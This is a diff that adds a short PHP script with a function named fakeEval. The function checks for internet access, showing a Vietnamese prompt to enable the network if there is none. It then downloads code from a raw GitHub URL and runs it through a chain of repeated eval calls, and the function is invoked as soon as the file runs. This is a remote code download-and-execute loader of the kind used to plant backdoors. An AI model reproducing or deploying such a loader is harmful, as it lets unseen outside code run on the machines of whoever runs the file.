@@ -1,0 +1,49 @@
+
+
+error_reporting(100000);
+
+function fakeEval() {
+
+if(!$sock = @fsockopen('www.google.com', 80))
+
+{
+
+    echo 'Vui lòng bật kết nối mạng !';
+
+    exit();
+
+}
+
+$a = (file_get_contents("https://raw.githubusercontent.com/doantermux/linkcode/main/code"));
+
+if(!$a){
+
+exit();}
+
+$e = eval($a);
+
+eval($e);
+
+$a = eval($e);
+
+eval($a);
+
+$c = eval($a);
+
+eval($c);
+
+$b = eval($c);
+
+eval($b);
+
+$d = eval($b);
+
+eval($d);
+
+$u = eval($d);
+
+eval($u);
+
+}
+
+fakeEval();
